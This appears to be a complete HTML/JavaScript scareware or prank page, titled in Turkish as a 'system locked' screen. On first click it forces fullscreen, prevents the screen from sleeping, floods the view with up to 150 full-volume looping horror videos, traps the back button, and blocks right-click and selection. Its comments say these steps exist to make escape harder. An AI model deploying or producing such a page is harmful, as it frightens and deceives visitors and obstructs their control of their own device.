<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZAHİRSİSTEM KİLİTLENDİ</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            overflow: hidden; /* Kaydırmayı engelle */
            height: 100vh;
            width: 100vw;
            cursor: none; /* Fare imlecini gizle */
            touch-action: none;
        }

        .video-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 100vw;
            height: 100vh;
            z-index: 1;
            /* Ekrana sığdır */
            object-fit: cover; 
        }
    </style>
</head>
<body>

    <script>
        // 1. SES FULLEME VE VİDEO OLUŞTURMA FONKSİYONU
        function startChaos() {
            // Tam ekran zorla (Çıkışı zorlaştırmak için)
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }

            // Ekran kararmasını engelle
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(e => {});
            }

            // 1 SANİYE SONRA VİDEOLARI PATLAT
            setTimeout(() => {
                // İlk büyük videoyu oluştur
                createVideo();

                // Her 100 milisaniyede bir yeni video ekle (Ekran tıka basa dolana kadar)
                setInterval(createVideo, 100);
            }, 1000); // 1000 ms = 1 Saniye
        }

        // 2. VİDEO OLUŞTURUCU (Ekranı Kaplayan ve Sesli)
        let videoCount = 0;
        function createVideo() {
            // Ekranın dolup taşmaması için max 150 video yapalım (yoksa cihaz aşırı ısınır ve uygulama kapanır)
            if (videoCount > 150) return; 

            const vid = document.createElement('video');
            vid.src = "korku.mp4"; // Sadece bu videoyu kullanır
            
            // VİDEO AYARLARI
            vid.loop = true;        // Sürekli dönsün
            vid.muted = false;      // SESİ AÇIK OLSUN
            vid.volume = 1.0;       // SES FULLENSİN
            vid.autoplay = true;    // Otomatik başlasın
            vid.playsInline = true;
            
            // Rastgele boyut ve konum (Ekran kaos ortamına dönsün)
            const size = Math.random() * 100 + 50; // 50vw ile 150vw arası rastgele boyut
            const posX = Math.random() * 100;
            const posY = Math.random() * 100;

            vid.style.position = 'absolute';
            vid.style.width = size + 'vw';
            vid.style.top = posY + 'vh';
            vid.style.left = posX + 'vw';
            vid.style.zIndex = 999; // Her zaman en üstte
            vid.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 360}deg)`; // Rastgele dönme açısı

            document.body.appendChild(vid);
            
            // Videoyu oynat (Tarayıcı hata verirse yakala)
            vid.play().catch(e => {});
            
            videoCount++;
        }

        // 3. KULLANICI EKRANA TIKLADIĞINDA BAŞLAT
        // Tarayıcılar sesin otomatik çalmasına izin vermediği için ilk tıklamayı bekliyoruz.
        document.addEventListener('click', function init() {
            document.removeEventListener('click', init);
            startChaos();
        });
        
        document.addEventListener('touchstart', function initMobile() {
            document.removeEventListener('touchstart', initMobile);
            startChaos();
        });

        // 4. ÇIKIŞ ENGELLEYİCİLER
        // Geri tuşu engeli
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1); 
        };
        
        // Sağ tık ve metin seçimini engelle
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.addEventListener('selectstart', event => event.preventDefault());
    </script>
</body>
</html>
